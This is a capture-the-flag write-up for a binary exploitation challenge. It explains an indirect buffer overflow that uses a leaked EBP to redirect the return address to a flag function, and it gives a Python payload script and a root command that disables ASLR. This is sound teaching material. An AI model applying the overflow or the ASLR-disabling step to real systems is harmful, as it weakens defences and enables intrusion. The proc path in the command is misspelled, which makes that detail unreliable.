# Remote School

## Solution

Out of all the PWN challenges this was intended to be the hardest.

The exploit is an indirect buffer overflow.
If we look around in the binary we see there is a class called Hackers that we can attend.
If we go there it gets our input and allows us to overwrite `8 bytes`.
The binary also leaks EBP for us.
In our vulnerable function we see there are two local variables.
We can assume one is a pointer as another variable's value is loaded into its address.

If we overwrite our local pointer variable's address with EBP+4 we can effectively control the return address.
Therefore we will need to overwrite the other local variable with the get flag function!

This will ensure that when we return from this function the flag is printed.

```python
import struct
flag_address = 0x56556299


ebp = 0xffff9bb8    # live ebp
# ebp = 0xffff9108  # gdb ebp

ret_address = struct.pack("I", ebp + 0x4)
flag_address = struct.pack("I", flag_address)

payload = 'a'*0x800 + flag_address + ret_address

print("Jordan\n")
print("attend Hacker")
print(payload)
```

## Note

ASLR was disabled on the server for this challenge. If running locally ensure you have ASLR off too.

Run, as root, `echo 0 > /proc/sys/kernal/randomize_va_space`
